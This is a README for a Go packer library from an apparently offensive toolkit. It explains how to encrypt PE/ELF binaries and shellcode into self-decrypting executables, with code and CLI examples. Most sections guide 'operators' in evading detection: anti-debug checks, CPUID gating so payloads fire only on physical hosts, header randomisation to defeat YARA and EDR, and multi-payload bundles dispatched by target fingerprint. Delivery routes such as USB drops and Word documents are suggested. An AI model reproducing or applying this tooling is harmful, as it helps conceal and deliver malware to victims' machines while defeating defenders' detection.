---
package: github.com/oioio-space/maldev/pe/packer
last_reviewed: 2026-05-09
---

# PE Packer

[← pe index](README.md) · [docs/index](../../index.md)

A pure-Go packer for PE/ELF binaries and shellcode. Produces a
self-contained executable that decrypts itself at startup and runs
the payload — no separate loader, no second stage, no operator-side
unpacking step. Single-target packing (one payload, in-place
encryption) and multi-target bundling (N payloads, runtime CPUID
dispatch) are both first-class.

> **New here?** Skim the [Glossary](#glossary) at the bottom of the page —
> every jargon term used in the rest of this doc is defined there in
> plain language. Notably *SGN*, *PIC trampoline*, *RWX*, *PE32+* /
> *ELF*, *Static-PIE*, *PT_LOAD*, *OEP*, *TLS callbacks*, *Imports* /
> *IAT*, *CPUID*, *PEB*, *auxv*, *rep movsb*, *Brian Raiter shape*,
> *Round* (in the SGN sense), *Payload*, *yara* — most one-liner
> definitions, all conceptual not API. If a paragraph below stops
> making sense, the term is probably in the glossary.

**MITRE ATT&CK:** [T1027.002 — Software Packing](https://attack.mitre.org/techniques/T1027/002/) ·
[T1140 — Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)

**Detection level:** Medium-High. Stub bytes are polymorphic per
pack; magic bytes are operator-secret-derived per build. The
structural shape of the produced binary (single-PT_LOAD-RWX ELF for
the all-asm path; appended `.mldv` section for `PackBinary`) remains
yara-able regardless.

---

## TL;DR

| You want… | Use | Output size (typical) |
|---|---|---|
| **Pack a single PE/ELF that runs natively** | `packer.PackBinary` | Input + ~1-8 KiB stub |
| **Wrap raw shellcode into a runnable .exe / .elf** (with or without encryption) | `packer.PackShellcode` | ~400 B plain / ~8 KiB encrypted |
| **Pack a payload that fingerprints the host first** (multi-target) | `packer.PackBinaryBundle` + the `cmd/bundle-launcher` runtime | ~5 MB (Go runtime) |
| **Same, but tiny single-file all-asm** | `packer.PackBinaryBundle` + `packer.WrapBundleAsExecutableLinux` / `…Windows` | ~470 B Linux · ~740 B Windows |
| **Same, with stronger per-payload encryption** (AES-128-CTR via AES-NI, Windows) | as above + `BundlePayload{CipherType: CipherTypeAESCTR}` | +~280 B stub + 176 B round keys per AES-CTR entry |
| **Reproducible packs across machines** (deterministic ciphertext) | `BundlePayload{Key: <16 B>}` (operator-supplied key) | Same as the matching cipher |
| **Encrypt arbitrary bytes into a blob (no exec)** | `packer.Pack` / `packer.Unpack` | Input + 32 B header + AES-GCM tag |
| **Compose multiple ciphers + permutations** | `packer.PackPipeline` | Same |
| **Inspect / extract a maldev artefact** (defender) | `cmd/packerscope` | n/a |
| **Visualise entropy + bundle structure** | `cmd/packer-vis` | n/a |

---

## Mental model

Three pipelines, orthogonal:

```
┌─────────────────────────────────────────────────────────────┐
│  Single-target pipeline (Go binary input)                    │
│                                                              │
│   payload.exe ──[PackBinary]──► packed.exe                   │
│   (real PE/ELF)                  │                           │
│                                  └─ kernel loads → SGN stub  │
│                                     decrypts .text in place  │
│                                     → JMP original entry     │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│  Shellcode pipeline (raw bytes input)                        │
│                                                              │
│   sc.bin ──[PackShellcode]──► out.exe / out.elf              │
│   (raw, position-       │                                    │
│    independent)         ├─ plain wrap → minimal host PE/ELF  │
│                         │  shellcode at e_entry              │
│                         │                                    │
│                         └─ encrypted wrap → minimal host →   │
│                            PackBinary → SGN stub envelope    │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│  Multi-target pipeline                                       │
│                                                              │
│   payload-A ──┐                                              │
│   payload-B ──┼─[PackBinaryBundle]──► bundle blob            │
│   payload-C ──┘                       │                      │
│              + FingerprintPredicate   │                      │
│              for each                 ▼                      │
│                                  ┌─[Wrap…]──► single .exe    │
│                                  │             (Go launcher  │
│                                  │              or all-asm)  │
│                                  ▼                           │
│                          runtime: read CPUID + Win build,    │
│                          match predicates, decrypt the ONE   │
│                          matching payload, dispatch.         │
└─────────────────────────────────────────────────────────────┘
```

Both pipelines are pure Go, no cgo. Both produce a runnable
executable on disk that the kernel loads normally — there is no
operator-side "unpack first then run" step.

---

## Quick start

### Single-target

You have a real PE or ELF binary; you want a packed version that
runs directly:

```go
package main

import (
    "log"
    "os"

    "github.com/oioio-space/maldev/pe/packer"
)

func main() {
    payload, err := os.ReadFile("payload.exe")
    if err != nil { log.Fatal(err) }

    packed, _, err := packer.PackBinary(payload, packer.PackBinaryOptions{
        Format:       packer.FormatWindowsExe,
        Stage1Rounds: 3,        // SGN polymorphic decoder rounds
        Compress:     true,     // LZ4 .text before SGN
        AntiDebug:    true,     // PEB.BeingDebugged + RDTSC delta probe
    })
    if err != nil { log.Fatal(err) }

    if err := os.WriteFile("packed.exe", packed, 0o755); err != nil {
        log.Fatal(err)
    }
}
```

CLI equivalent:

```bash
$ packer pack -in payload.exe -out packed.exe -format windows-exe \
    -rounds 3 -compress -antidebug
```

The packed binary runs directly: `./packed.exe`. The kernel maps it,
the appended stub takes over at the new entry point, peels the SGN
encoding off the `.text` section in place, optionally LZ4-decompresses,
then jumps to the original entry point. The payload sees a normal
process — its imports are resolved by the kernel (not by us), its TLS
callbacks fire, its language runtime initialises, etc.

### Multi-target — operator workflow

You have three distinct payloads, each tuned for a different target
environment, and you want a single shippable file that picks the
right one at runtime:

```bash
# Pick a fresh per-deployment secret. Store it; you'll need it for
# the launcher build.
SECRET="ops-2026-05-09-target-A"

# Build per-target payloads. These can be packer.PackBinary outputs
# (single-target packed binaries), regular ELF/PE binaries, or raw
# shellcode — depends on the runtime model you pick below.
$ build-payload-w11.sh
$ build-payload-w10.sh
$ build-fallback.sh

# Pack the bundle. -secret derives a per-build BundleMagic + footer
# magic via HKDF-SHA256 (RFC 5869, v0.83.0+) so two operators using
# different secrets ship byte-distinct bundles. Each derived field
# uses its own purpose-bound HKDF label, so flipping bits in one
# field gives an attacker no algebraic handle on the others.
$ packer bundle -out bundle.bin -secret "$SECRET" \
    -pl payload-w11.exe:intel:22000-99999 \
    -pl payload-w10.exe:amd:10000-19999   \
    -pl fallback.exe:*:*-*

# Two ways to turn the bundle into a runnable executable. Pick one:

# OPTION A — Go-runtime launcher (~5 MB, full feature set)
$ go build -ldflags "-X main.bundleSecret=$SECRET" \
    -o bundle-launcher ./cmd/bundle-launcher
$ packer bundle -wrap bundle-launcher -bundle bundle.bin \
    -secret "$SECRET" -out app

# OPTION B — All-asm tiny ELF (~470 B for vendor-aware 1-payload)
# Requires: payload bytes are raw position-independent shellcode,
# NOT a packed PE/ELF. The stub jumps directly into the bytes.
$ # programmatic only:
$ go run path/to/your-build-program.go    # uses
                                          # WrapBundleAsExecutableLinux

# Ship app. It dispatches at runtime.
$ ./app
```

Programmatic equivalent:

```go
intel := [12]byte{'G','e','n','u','i','n','e','I','n','t','e','l'}
amd   := [12]byte{'A','u','t','h','e','n','t','i','c','A','M','D'}

profile := packer.DeriveBundleProfile([]byte("ops-2026-05-09-target-A"))

bundle, err := packer.PackBinaryBundle(
    []packer.BundlePayload{
        {Binary: w11Payload, Fingerprint: packer.FingerprintPredicate{
            PredicateType: packer.PTCPUIDVendor | packer.PTWinBuild,
            VendorString:  intel,
            BuildMin:      22000, BuildMax: 99999,
        }},
        {Binary: w10Payload, Fingerprint: packer.FingerprintPredicate{
            PredicateType: packer.PTCPUIDVendor | packer.PTWinBuild,
            VendorString:  amd,
            BuildMin:      10000, BuildMax: 19999,
        }},
        {Binary: fallbackPayload, Fingerprint: packer.FingerprintPredicate{
            PredicateType: packer.PTMatchAll,
        }},
    },
    packer.BundleOptions{Profile: profile},
)
```

---

## Operation modes

### Mode 1 — `Pack` / `Unpack` (blob, no exec)

The simplest layer. Encrypts arbitrary bytes into a self-describing
maldev-format blob. **The blob is data, not an executable.** Use this
when the operator's chain reads the blob and passes the plaintext
into another step (an injector, a custom loader, a separate
decryption pipeline, etc.).

```go
blob, key, err := packer.Pack(payload, packer.Options{})
recovered, err := packer.Unpack(blob, key)
```

| Property | Value |
|---|---|
| Output | `MLDV…` blob, ~payload size + 32 B header + AEAD tag |
| Encryption | AES-GCM (default). ChaCha20 / RC4 reserved. |
| Runs by itself? | **No** — it's a blob, not an exe |
| Key handling | Returned to caller; ship via separate channel |

**Avantages:** smallest output. Works on any byte stream — PE, ELF,
shellcode, JSON config, anything. Good as a building block inside a
larger chain.

**Inconvénients:** the operator (or their loader code) needs the key.
The blob has a `MLDV` magic at offset 0 — trivially yara-able. Use
`PackBinary` or wrap the blob in a host PE if you need to ship the
blob standalone.

### Mode 2 — `PackPipeline` / `UnpackPipeline` (composed blob)

Stack multiple ciphers / compressors / permutations. Each stage is
keyed independently; the operator gets back a `PipelineKeys` slice
of per-step key material they need to transport alongside the blob
to recover the payload.

```go
pipeline := []packer.PipelineStep{
    {Op: packer.OpCompress, Algo: uint8(packer.CompressorFlate)},
    {Op: packer.OpCipher,   Algo: uint8(packer.CipherAESGCM)},
}
blob, keys, err := packer.PackPipeline(payload, pipeline)
recovered, err := packer.UnpackPipeline(blob, keys)
```

Same shape as `Pack`; just stronger obfuscation when the operator
has somewhere to store multiple keys.

### Mode 3 — `PackBinary` (single-target, runs directly)

This is what most operators actually want when they have ONE
payload. Modifies the input PE/ELF in place: encrypts the `.text`
section with an SGN polymorphic encoder, appends a small CALL+POP+ADD
decoder stub as a new section, rewrites the entry point. Output is a
**single self-contained binary the kernel loads normally**. Imports
are resolved by the kernel — the loader is the OS, not us. No second
stage. No operator-side unpack.

```go
packed, _, err := packer.PackBinary(input, packer.PackBinaryOptions{
    Format:       packer.FormatWindowsExe,  // or FormatLinuxELF
    Stage1Rounds: 3,
    Seed:         0,                        // 0 = crypto-random per pack
    Compress:     true,
    AntiDebug:    true,

    // Phase 2 PE-only fingerprint defeats — all opt-in, all
    // default false (preserves byte-reproducible packs).
    RandomizeAll: true,
    // Or pick selectively:
    //   RandomizeStubSectionName       — `.mldv` → `.xxxxx`     (Phase 2-A)
    //   RandomizeTimestamp             — COFF TimeDateStamp     (Phase 2-B)
    //   RandomizeLinkerVersion         — Optional Header        (Phase 2-C)
    //   RandomizeImageVersion          — Optional Header        (Phase 2-D)
    //   RandomizeExistingSectionNames  — `.text/.data/.rdata`   (Phase 2-F-1)
    //                                    → random `.xxxxx` per section,
    //                                    appended stub name preserved.
    //   RandomizeJunkSections          — append [1, 5] BSS sections (Phase 2-F-2)
    //                                    after the stub. File size unchanged
    //                                    (uninitialised, zero file backing);
    //                                    only NumberOfSections + SizeOfImage
    //                                    grow. Defeats "exact section count"
    //                                    + "stub is the last header" patterns.
    //   RandomizePEFileOrder           — permute the FILE order of host
    //                                    section bodies (Phase 2-F-3-b). VAs,
    //                                    relocs, DataDirectory, OEP all
    //                                    unchanged — runtime image byte-
    //                                    identical. Defeats YARA rules
    //                                    anchored at file offsets ("file
    //                                    0x400 = decryption key bytes").
    //                                    COFF.PointerToSymbolTable is updated
    //                                    when the carrier section moves.
})
```

| Property | Value |
|---|---|
| Output | Real PE32+ / ELF64 — `./packed.exe` runs |
| Encryption | SGN polymorphic encoder (per-round register-randomised) |
| Compression | LZ4 (optional, `-compress` flag) |
| Anti-debug | Optional PEB + RDTSC probe (Windows only) |
| Runs by itself? | **Yes** |
| Process tree | One binary (the kernel does the load) |
| Stub size | ~1 KB without `-compress`, ~8 KB with |

**Avantages:**
- Drop-in replacement: takes a real binary in, produces a real
  binary out, runs natively.
- Stub is polymorphic per pack (different bytes for each call).
- No Go runtime, no separate loader file, no operator-side decrypt
  step.
- Works for both Windows PE and Linux static-PIE ELF.

**Inconvénients:**
- The `.text` section is now RWX (the stub mutates it during decrypt).
  Loud signal for any EDR worth its salt.
- Imports/exports/resources of the input binary are visible in the
  packed output (only `.text` is encrypted). For full IAT scrambling
  you'd compose with `pe/morph` upstream.
- TLS callbacks are not supported (would run before our stub got a
  chance to decrypt) — surfaced as `transform.ErrTLSCallbacks`.

#### CLI

```bash
$ packer pack -in input.exe -out packed.exe -format windows-exe \
    -rounds 3 -compress -antidebug
```

### Mode 4 — `PackBinaryBundle` + Go-runtime launcher

You have N payloads, each meant for a different target environment.
Ship them all in one binary; let the runtime pick.

```go
bundle, err := packer.PackBinaryBundle(payloads, packer.BundleOptions{
    FallbackBehaviour: packer.BundleFallbackExit,
    Profile:           packer.DeriveBundleProfile([]byte(secret)),
})

// Concatenate the bundle onto a pre-built launcher binary.
launcher, _ := os.ReadFile("bundle-launcher")
wrapped := packer.AppendBundleWith(launcher, bundle, profile)
os.WriteFile("app", wrapped, 0o755)
```

The launcher reads its own binary at startup, locates the embedded
bundle via a trailing 16-byte footer (`bundleStartOffset:8` +
`FooterMagic:8`), reads the host's CPUID vendor and Windows build
number, walks the FingerprintEntry table for a match, decrypts the
matched payload, and dispatches.

Two dispatch paths exposed via `MALDEV_REFLECTIVE` env var:

| Path | Mechanism | Process tree | Disk artefact |
|---|---|---|---|
| Default | `memfd_create` + `execve` (Linux) / temp file + `CreateProcess` (Windows) | 2 binaries | Linux: none; Windows: TMP/* |
| `MALDEV_REFLECTIVE=1` | In-process load via `pe/packer/runtime.Prepare` | **1 binary** | none (anonymous mappings) |

| Property | Default | Reflective |
|---|---|---|
| Total size | ~5 MB | ~5 MB |
| Stub | Go runtime | Go + asm trampoline |
| Predicate evaluator | full (CPUID + Win build + Negate flag) | full |
| Payload format | PE/ELF (gets exec'd) | static-PIE ELF (gets mapped in-process) |

**Avantages:**
- Full FingerprintPredicate evaluator including PT_WIN_BUILD ranges
  and the Negate flag.
- Three fallback modes (`Exit` / `First` / `Crash`) for no-match.
- Reflective path has zero on-disk plaintext for the matched payload.

**Inconvénients:**
- Total size is dominated by the Go runtime (~5 MB minimum). Pay
  this once; subsequent packs of the same launcher reuse the size.
- Reflective load expects the payload to be a kernel-loadable
  static-PIE ELF — not raw shellcode (use Mode 5 for that).

#### `BundlePayload` + `FingerprintPredicate` — full guide

Both Modes 4 and 5 take a `[]packer.BundlePayload` as input. Each
entry pairs a payload with the **rule** that decides whether THAT
payload should fire on the current host. New operators commonly find
this two-level structure confusing — this section walks through the
why, the what, and every legal value.

##### Why a bundle exists (operational need)

You have a payload tuned for Windows 11 Intel and another for
Windows 10 AMD. Without a bundle you would either:

- ship two separate binaries and choose the right one out-of-band
  (impossible without prior recon), or
- ship the wrong one and crash / trip the EDR.

A bundle is **one file** carrying N payloads + per-host dispatch
logic. The wrapped binary boots, reads its own CPUID + Windows
build, picks the matching payload, decrypts only that one, JMPs.
The non-selected payloads stay encrypted on disk — analysts dumping
the bundle without the per-payload XOR keys see noise at every
non-active offset.

Mental shape: **multi-stage rocket with a runtime selector**. You
pre-load several stages; the binary picks one to ignite based on
where it landed.

##### `BundlePayload` — what it carries

```go
type BundlePayload struct {
    Binary      []byte               // executable bytes (PE / ELF / shellcode, mode-dependent)
    Fingerprint FingerprintPredicate // "what the host must look like for THIS payload to match"
    CipherType  uint8                // 0/1 = XOR-rolling (default), 2 = AES-128-CTR (v0.92+)
    Key         []byte               // operator-supplied 16-byte key, nil = pack-time random (v0.92+)
}
```

Just a pair `(payload, firing rule)` plus two optional v0.92
per-payload knobs:

- **`CipherType`** picks the encrypt-then-decrypt algorithm for
  THIS payload. Zero or 1 = the original XOR-rolling cipher
  (~6-instruction stub-side decrypt loop, every host). 2 =
  AES-128-CTR via AES-NI (Mode 5 all-asm V2NW stub decrypts at
  runtime; AES-NI feature bit auto-injected into the entry's
  `PT_CPUID_FEATURES` predicate so pre-AES-NI hosts skip cleanly).
  Mix freely within one bundle — each PayloadEntry carries its own
  type byte.
- **`Key`** is the operator-supplied 16-byte encryption key. Leave
  nil and pack-time generates a fresh crypto-random one (the
  default — preserves per-payload secrecy). Non-nil 16 bytes is
  used verbatim — enables reproducible packs across machines and
  HKDF-from-deployment-secret workflows. Any other length returns
  the `ErrBundleBadKeyLen` sentinel.

Assemble N of them, hand to `PackBinaryBundle`.

##### `FingerprintPredicate` — the matching rule

```go
type FingerprintPredicate struct {
    PredicateType     uint8     // bitmask: which checks to enable
    VendorString      [12]byte  // expected CPUID EAX=0 vendor bytes
    BuildMin, BuildMax uint32   // Windows build-number range
    CPUIDFeatureMask  uint32    // mask over CPUID[1].ECX
    CPUIDFeatureValue uint32    // expected value under the mask
    Negate            bool      // invert the overall match outcome
}
```

##### `PredicateType` — the bitmask of active checks

| Constant | Value | Activates |
|---|---|---|
| `PTCPUIDVendor` | `1 << 0` | `VendorString` against CPUID EAX=0 (12 bytes) |
| `PTWinBuild` | `1 << 1` | `OSBuildNumber` against `[BuildMin, BuildMax]` |
| `PTCPUIDFeatures` | `1 << 2` | `(CPUID[1].ECX & Mask) == Value` |
| `PTMatchAll` | `1 << 3` | **wildcard** — matches any host |

**Combination rules:**
- Within ONE predicate: all enabled bits are **ANDed**. Every active
  check must pass.
- Across predicates: the **first matching entry wins**. Order matters
  — put specific entries first, wildcards last.

##### `VendorString` — the three real values

Three exported `[12]byte` constants cover every consumer x86_64
CPU shipped today:

```go
packer.VendorIntel  // "GenuineIntel"
packer.VendorAMD    // "AuthenticAMD"
packer.VendorHygon  // "HygonGenuine" — Chinese AMD-compatible CPUs
```

Read only when `PTCPUIDVendor` is set in `PredicateType`. Zero/empty
value means "wildcard vendor" (any).

##### `BuildMin` / `BuildMax` — Windows build cheat sheet

The number returned by `RtlGetVersion().BuildNumber` (== PEB
`OSBuildNumber`). Useful reference values:

| Build | OS |
|---|---|
| 7600 | Windows 7 |
| 9200 | Windows 8 |
| 10240 | Windows 10 1507 |
| 19041 | Windows 10 2004 |
| 19045 | Windows 10 22H2 |
| 22000 | Windows 11 21H2 |
| 22631 | Windows 11 23H2 |
| 26100 | Windows 11 24H2 |

Range is **inclusive**. `0` on either side means "unbounded that side":

- `BuildMin: 22000, BuildMax: 99999` → Windows 11+ only
- `BuildMin: 10240, BuildMax: 19999` → Windows 10 only
- `BuildMin: 0,     BuildMax: 9999`  → everything below Windows 10

Read only when `PTWinBuild` is set.

##### `CPUIDFeatureMask` / `Value` — fine-grained feature gating

Useful bits in `CPUID[1].ECX`:

| Bit | Feature |
|---|---|
| 0 | SSE3 |
| 9 | SSSE3 |
| 19 | SSE4.1 |
| 20 | SSE4.2 |
| 25 | AES-NI |
| 28 | AVX |
| 31 | Hypervisor present (1 = running in VM) |

Operationally meaningful: bit 31 = anti-sandbox primitive. Setting
`Mask = 1 << 31, Value = 0` means "fire only on physical hosts".

Read only when `PTCPUIDFeatures` is set. `Mask = 0` skips the check
even if the bit is enabled in `PredicateType`.

##### `Negate` — invert the predicate

Flips the overall match outcome. Lets operators write "everything
EXCEPT X" rules without enumerating X. As of v0.88.0 honoured by all
three paths: Mode 4 launcher's host-side `SelectPayload`, the
Go-runtime evaluator, AND the Mode 5 all-asm stub (V2-Negate on Linux,
V2NW on Windows). CLI: append `:negate` to the `-pl` spec, e.g.
`-pl exclude-vm.exe:intel:0-99999:negate`.

##### Runtime flow (what happens on the target)

```
[bundled binary boots on target]
  ↓
1. read CPUID EAX=0  → vendor 12 bytes
2. read CPUID EAX=1  → ECX features
3. read PEB.OSBuildNumber → Windows build
  ↓
4. for each FingerprintEntry in bundle:
       result = AND(active checks)
       if Negate: flip
       if match: break
  ↓
5a. match found → XOR-decrypt that payload (16-byte per-payload key) → JMP entry
5b. no match    → apply BundleFallbackBehaviour
        Exit  → ExitProcess(0) silent
        Crash → deliberate SIGSEGV (sandbox alert)
        First → payload 0 unconditionally (dev / test only)
```

Other payloads stay ciphertext on disk. Without their per-payload XOR
keys, an analyst dumping the bundle sees noise at every non-active
offset.

##### `CipherType` — per-payload cipher (v0.92+)

**Why this matters.** Every bundle entry's payload bytes get
encrypted at pack-time and decrypted at runtime. Pre-v0.92 the
cipher was a fixed 16-byte XOR with a rolling key — cheap (~17
bytes of asm) and survives YARA-on-plaintext, but it's not
*cryptography*: anyone holding the bundle can recover plaintext
from the on-disk key (which is precisely what `cmd/packerscope
extract` demonstrates — the key field sits next to the ciphertext
because the runtime stub needs it). The all-asm wrap is a
delivery-time obfuscation, not a secrecy guarantee.

v0.92 added a second option — proper AES-128-CTR — that operators
can pick per-payload. The wire field lives at `PayloadEntry[12]`;
every runtime evaluator (host-side `SelectPayload`, Go-runtime
launcher, AND the all-asm V2NW Windows stub) dispatches on it,
which means a single bundle can mix XOR-rolling entries for the
cheap fast-path and AES-CTR entries for the higher-stakes payload.

| Value | Constant | Cipher | Stub cost | When |
|---|---|---|---|---|
| 0 (zero) | — | normalises to `CipherTypeXORRolling` for backward compat | — | bundles packed before v0.92 |
| 1 | `CipherTypeXORRolling` | XOR with a 16-byte rolling key (byte XORed against `Key[i%16]`) | ~17 B decrypt loop | small budget, AES-NI absent, plaintext already self-validating |
| 2 | `CipherTypeAESCTR` | AES-128-CTR, random IV per pack, 11 round keys shipped in-wire | +281 B in V2NW (148 B AES-NI block decrypt + counter management + dispatch) | proper crypto wanted; the host has AES-NI (every desktop x86-64 since ~2010) |

**Decision matrix:**

| You want… | Use |
|---|---|
| **Smallest stub possible** (Linux Mode 5 baseline ~470 B) | `CipherTypeXORRolling` |
| **Stronger crypto** (the AES key bytes don't trivially reveal the plaintext to an analyst dumping the bundle) | `CipherTypeAESCTR` |
| **Windows + a payload that's >a few hundred bytes** (the +281 B stub overhead amortises) | `CipherTypeAESCTR` |
| **Mix of one decoy XOR payload + one real AES-CTR payload** in the same bundle | both — set per-`BundlePayload` |
| **Linux Mode 5 + AES-CTR** | not yet — V2-Negate (Linux) stays XOR-rolling-only as of v0.92. Use Mode 4 (Go-runtime launcher) for AES-CTR on Linux. |
| **Reproducible ciphertext across machines** (XOR-rolling) | `CipherTypeXORRolling` + operator-supplied `BundlePayload.Key` |
| **AES-CTR but reproducible keys, accepting random IV** | `CipherTypeAESCTR` + `BundlePayload.Key` (round keys identical across packs; IV+ciphertext differ) |

**CipherType=2 wire layout** (per entry):

```text
[IV (16 B)] [AES-CTR ciphertext padded to 16-byte multiple] [11 × 16 B = 176 B round keys]
```

- `PayloadEntry.Key` (16 B) = AES-128 key.
- `PayloadEntry.DataSize` = 16 + padded_ciphertext_len + 176.
- `PayloadEntry.PlaintextSize` = ORIGINAL plaintext length (not the padded one).
  `UnpackBundle` trims the decrypted output back to this.
- Round keys are produced at pack-time via [`crypto.ExpandAESKey`](../crypto/payload-encryption.md);
  the all-asm stub `MOVDQU`s them directly into XMM at runtime,
  saving the in-stub key-expansion step (~50 B of asm).
- Pack-time auto-injects the AES-NI feature bit (`0x02000000`) into
  the entry's `PT_CPUID_FEATURES` mask + value via a strict OR
  (operator-supplied feature constraints survive). Pre-AES-NI hosts
  fail the predicate and skip the entry — no crash.

**Constraints:**
- Mutually exclusive with `BundleOptions.FixedKey` (the
  test-determinism switch) — AES-CTR's random IV defeats fixed-key
  determinism. Returns `ErrCipherTypeFixedKey`.
- The all-asm Linux V2-Negate stub does NOT dispatch on CipherType
  as of v0.92 — only V2NW (Windows) does. CipherType=2 + Linux
  Wrap path = host-side via `cmd/bundle-launcher` only.

**Worked example — AES-CTR payload:**

```go
bundle, _ := packer.PackBinaryBundle([]packer.BundlePayload{{
    Binary:     shellcode,
    CipherType: packer.CipherTypeAESCTR,
    Fingerprint: packer.FingerprintPredicate{
        PredicateType: packer.PTMatchAll,
        // No need to set CPUIDFeatureMask/Value yourself —
        // pack-time auto-injects the AES bit. If you DO set them
        // for other constraints (e.g. SSE3 also required), the AES
        // bit is OR'd in alongside yours, never overwritten.
    },
    // Key: nil — pack-time generates a fresh random 16 B AES key.
}}, packer.BundleOptions{})

exe, _ := packer.WrapBundleAsExecutableWindows(bundle)
// Drop on any AES-NI Windows host → V2NW stub: scan loop →
// matched entry → CipherType dispatch → AES-CTR decrypt loop →
// JMP into plaintext.
```

##### `BundleOptions` — bundle-level knobs

```go
type BundleOptions struct {
    FallbackBehaviour BundleFallbackBehaviour // Exit / Crash / First — see above
    FixedKey          []byte                  // tests only — reuses one XOR key across payloads
    Profile           BundleProfile           // per-build IOC overrides; see Kerckhoffs section
}
```

`Profile` carries the per-deployment magics derived from the operator's
secret string via [`DeriveBundleProfile`](#per-build-ioc-randomisation--kerckhoffs).
Production callers MUST set a fresh secret per ship to keep YARA
signatures from clustering across deployments.

##### Worked example — annotated

```go
intel := packer.VendorIntel
amd   := packer.VendorAMD

bundle, _ := packer.PackBinaryBundle([]packer.BundlePayload{
    // [0] Windows 11 Intel — most specific, evaluated first.
    {Binary: w11Payload, Fingerprint: packer.FingerprintPredicate{
        PredicateType: packer.PTCPUIDVendor | packer.PTWinBuild,
        VendorString:  intel,
        BuildMin: 22000, BuildMax: 99999,
    }},

    // [1] Windows 10 AMD only.
    {Binary: w10Payload, Fingerprint: packer.FingerprintPredicate{
        PredicateType: packer.PTCPUIDVendor | packer.PTWinBuild,
        VendorString:  amd,
        BuildMin: 10240, BuildMax: 19999,
    }},

    // [2] Anti-sandbox — physical hosts only (hypervisor bit clear).
    {Binary: physOnlyPayload, Fingerprint: packer.FingerprintPredicate{
        PredicateType:     packer.PTCPUIDFeatures,
        CPUIDFeatureMask:  1 << 31,  // hypervisor bit
        CPUIDFeatureValue: 0,        // must be 0 = not in a VM
    }},

    // [3] Wildcard fallback — must come last (first-match wins).
    {Binary: genericPayload, Fingerprint: packer.FingerprintPredicate{
        PredicateType: packer.PTMatchAll,
    }},
}, packer.BundleOptions{
    FallbackBehaviour: packer.BundleFallbackExit,
    Profile:           packer.DeriveBundleProfile([]byte(secret)),
})
```

How it dispatches:

| Target | Result |
|---|---|
| Win11 Intel desktop | [0] fires |
| Win10 AMD desktop | [1] fires |
| Win10 Intel desktop | [0] / [1] fail vendor or build → [2] checks hypervisor bit; if physical → [2], else → [3] |
| Win11 inside a VM | [0] passes vendor + build → [0] fires (the VM check is a per-payload opt-in, not bundle-wide) |
| Win7 Intel | [0] / [1] fail build → [2] / [3] resolve as above |
| anything exotic | [3] fires |

##### CLI shorthand

The `cmd/packer bundle` subcommand exposes a compact spec syntax for
common cases:

```bash
packer bundle -out app.bundle \
    -pl payload-w11.exe:intel:22000-99999 \
    -pl payload-w10.exe:amd:10240-19999 \
    -pl fallback.exe:*:*-* \
    -fallback exit

# Dry-run on the host — what would fire here?
packer bundle -match app.bundle

# Dump structure (defender-friendly)
packer bundle -inspect app.bundle

# Wrap into a runnable .exe via the launcher
packer bundle -wrap launcher.exe -bundle app.bundle -out final.exe
```

Vendor `*` and build `*` decode to wildcards (`PTMatchAll` if both, or
the per-bit equivalent for partial wildcards).

##### Defensive lens (Kerckhoffs)

The wire format is public — what stays operator-private is:

- The `Profile` magics (BundleMagic, FooterMagic, ImageBase, etc.)
  derived from a per-deployment secret string.
- The 16-byte XOR keys baked per payload (random per pack).

Two ships of the same payload set with different secrets produce two
binaries with no shared YARA-able structural bytes. An analyst with
the binary but not the secret can identify it as *a* maldev bundle
but cannot mechanically align signatures across deployments.

### Mode 5 — `PackBinaryBundle` + all-asm wrap (tiny)

**Why this mode exists.** Mode 4 ships a working multi-target
bundle in ~5 MB because it carries the Go runtime to evaluate the
fingerprint predicate. For ops where size matters — a USB drop,
an embedded payload inside a Word doc, a TFTP boot stage —
that's not an option. Mode 5 replaces the Go runtime with a
hand-rolled asm dispatcher that does the same thing in **~470
bytes on Linux** or **~740 bytes on Windows**: read CPUID, walk
the FingerprintEntry table, decrypt the matched payload, JMP
into it. Same wire format as Mode 4; the operator chooses the
runtime at wrap-time.

Same bundle wire format as Mode 4, but the runtime is a
Builder-emitted x86-64 stub wrapped in a minimal hand-written
ELF / PE32+ (Brian Raiter shape on Linux: `Ehdr + 1 PT_LOAD +
stub + bundle blob`). No Go runtime. The stub does CPUID
dispatch, decrypts the matched payload in place (XOR-rolling
or AES-CTR — operator's per-payload choice, v0.92+) and JMPs
into the matched payload bytes directly.

```go
bundle, _ := packer.PackBinaryBundle(payloads, packer.BundleOptions{Profile: profile})
out, err := packer.WrapBundleAsExecutableLinuxWith(bundle, profile)
os.WriteFile("app", out, 0o755)
```

| Property | Value |
|---|---|
| Total size | **~470 B** Linux PTMatchAll, **~740 B** Windows V2NW (XOR-rolling); **~2 KiB** wrapped PE with one AES-CTR payload (V2NW + 281 B AES-NI dispatch + 176 B round keys) |
| Stub | Builder-emitted x86-64 + Intel multi-byte NOP polymorphism (3 slots A/B/C, v0.90+) |
| Predicate evaluator | full — `PT_MATCH_ALL` + `PT_CPUID_VENDOR` + `PT_WIN_BUILD` (Windows V2NW) + `PT_CPUID_FEATURES` + `Negate` (v0.88+) |
| Cipher dispatch | per-payload `CipherType`: XOR-rolling default + AES-128-CTR via AES-NI on Windows V2NW (v0.92+; Linux V2-Negate XOR-rolling only) |
| Payload format | **Raw shellcode only** — stub JMPs into the bytes |
| Process tree | 1 binary (no fork, no execve) |
| Disk artefact | none |

**Avantages:**
- Smallest possible runnable bundle: a 2-payload Intel-vs-AMD
  dispatcher fits in ~550 bytes.
- Per-pack polymorphism via Intel-recommended multi-byte NOPs spliced
  at a safe slot — two packs of the same bundle produce distinct
  byte sequences.
- No Go runtime fingerprint.

**Inconvénients:**
- Payload must be raw position-independent shellcode (the stub jumps
  directly into the decrypted bytes). PE/ELF payloads need Mode 4.
- `PT_WIN_BUILD` only meaningful on Windows targets (V2NW reads
  `PEB.OSBuildNumber`); Linux V2-Negate stub treats the build-number
  predicate as a no-op (use `PT_CPUID_VENDOR` / `PT_CPUID_FEATURES` /
  `PT_MATCH_ALL` for cross-platform predicates).

### Mode 6 — `PackShellcode` (raw shellcode → runnable PE/ELF)

Shipped v0.81.0. Bridges the operator gap "I have raw shellcode bytes
(msfvenom, hand-rolled stage-1) and want a runnable `.exe` / `.elf`".
[`PackBinary`](#mode-3--packbinary-single-target-runs-directly) rejects
non-PE / non-ELF inputs because it transforms existing sections in
place — there is nothing to transform when the input is bare bytes.
